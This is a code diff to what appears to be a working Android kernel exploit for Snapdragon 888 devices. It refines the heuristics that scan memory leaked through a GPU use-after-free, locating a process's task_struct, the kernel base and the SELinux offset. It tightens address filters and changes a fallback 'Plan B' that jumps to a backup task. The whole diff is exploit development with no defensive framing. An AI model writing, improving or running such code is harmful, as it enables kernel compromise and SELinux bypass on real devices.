@@ -1450,6 +1450,8 @@ static uint64_t find_kernel_base_from_task_struct(uint8_t *task_data, size_t dat
                 continue;
             if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
                 continue;
+            if (test_base > 0xffffffff00000000ULL)
+                continue;
 
             uint64_t selinux_test = test_base + SELINUX_OFFSET;
             uint8_t sdata[8] = {0};
@@ -1483,6 +1485,8 @@ static uint64_t find_kernel_base_from_task_struct(uint8_t *task_data, size_t dat
             if (test_base == 0)
                 continue;
             if ((test_base & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
+                continue;
+            if (test_base > 0xffffffff00000000ULL) // Too high for SD888
                 continue;
 
             uint8_t test_data[8] = {0};
@@ -1801,7 +1805,7 @@ static int analyze_uaf_page(uint8_t *data, uint64_t va) {
             (unsigned long)va, kptrs, strings, marker_off, found_str);
     
     // Target bash fallback: ROG task_struct often has kptrs > 150
-    if (marker_off == -1 && kptrs > 100) {
+    if (marker_off == -1 && kptrs > 100 && strings > 0) {
          fprintf(stderr, "\n      [!!!] High K-PTR density at VA 0x%lx! Possible task_struct (Sample: \"%s\")", 
                  (unsigned long)va, found_str);
          
@@ -1987,13 +1991,17 @@ static int scan_uaf_for_nonzero_multi(int fd, struct nonzero_page *found_pages, 
             int kptrs = analyze_uaf_page(bytes, current_va);
             
             // Plan B: if we found a high-density page (saved in gbuf) but no marker yet
+            // Now stricter: only if we have a task_va and it's a real task (strings > 0 check is in analyze_uaf_page)
             if (marker_found == 0 && *(uint64_t*)&gbuf[GBUF_TASK_VA] != 0) {
-                // If density is very high (>150) or we've scanned enough, trigger Plan B
-                if (kptrs > 160 || total_pages_scanned > 1500) {
-                    fprintf(stderr, "\n      [!!!] TRIGGERING PLAN B: High-density task (K-PTRs: %d) at 0x%lx\n", 
-                            kptrs, (unsigned long)*(uint64_t*)&gbuf[GBUF_TASK_VA]);
+                // If density is very high (>160) AND it has strings (analyze_uaf_page set task_va)
+                // OR we've scanned almost everything
+                if (total_pages_scanned > 3000) {
+                    fprintf(stderr, "\n      [!!!] TRIGGERING PLAN B: No marker found, using backup task at 0x%lx\n", 
+                            (unsigned long)*(uint64_t*)&gbuf[GBUF_TASK_VA]);
                     marker_found = 1;
-                    goto cleanup;
+                    current_va = *(uint64_t*)&gbuf[GBUF_TASK_VA]; // Jump to the backup task for parsing
+                    // Read it again to be sure it's in 'bytes'
+                    gpu_read_task_struct(fd, current_va, bytes, 4096);
                 }
             }
 
